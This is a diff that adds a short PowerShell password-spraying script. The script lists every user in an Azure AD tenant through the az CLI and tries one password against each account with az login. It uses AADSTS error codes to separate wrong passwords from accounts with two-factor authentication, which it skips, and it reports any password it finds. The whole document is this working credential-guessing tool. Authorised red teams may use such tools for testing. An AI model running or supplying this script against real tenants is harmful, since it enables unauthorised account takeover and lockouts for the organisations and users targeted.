@@ -1,0 +1,25 @@
+# The password to be tried on all accounts
+$password = "<Password to Try>"
+
+# Get all accounts
+$account_names = (az ad user list --query "[].userPrincipalName") | ConvertFrom-Json
+
+foreach ( $account_name in $account_names ) {
+    echo "Trying account $account_name"
+
+    # Try to login with the password
+    $signed_in = (az login --tenant "<Tenant Name>" -u "`"${account_name}`"" -p "`"${password}`"" --allow-no-subscriptions 2>&1)
+
+    # Check for wrong password error code
+    if ($signed_in -like '*AADSTS50126*') {
+        echo "Wrong password!"
+    }
+    elseif ($signed_in -like '*AADSTS90014*') {
+        # Has two-factor authentication, skip
+    }
+    # Else the password is found!
+    else {
+        echo "Password $($password) found for account $($account_name)"
+        break
+    }
+}
